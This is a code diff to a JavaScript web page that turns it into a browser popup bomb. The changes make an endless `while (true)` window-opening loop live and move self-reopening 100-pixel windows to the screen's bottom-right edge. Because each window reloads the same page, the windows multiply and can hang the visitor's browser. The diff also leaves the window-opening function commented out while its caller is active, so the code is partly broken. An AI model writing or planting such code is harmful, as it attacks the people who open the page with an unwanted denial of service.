@@ -25,7 +25,6 @@ var onLocalStorageEvent = function(e){
 // Check if another page is open after a short delay
 var openCheck = setTimeout(function(){
   if (anotherPageOpen) {
-    //alert("One more page already open");
       /*function openWindow(url) {
         const newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
         if (newWin) {
@@ -38,15 +37,14 @@ var openCheck = setTimeout(function(){
             newWin.moveTo(randomX, randomY);
 
             return newWin;
-        }
+        }*/
     }
-    while (true) openWindow('');*/
+    while (true) openWindow('');
   } else {
-    //alert("No other page open");
       // Open 4 small windows at the bottom of the screen
             for (let i = 0; i < 4; i++) {
                 let newWin = window.open(window.location.href, '_blank', 'width=100,height=100,resizable=no,scrollbars=no');
-            newWin.moveTo(0, screen.height);
+                newWin.moveTo(screen.width, screen.height);
             }
 
             // Open a new tab with custom HTML content
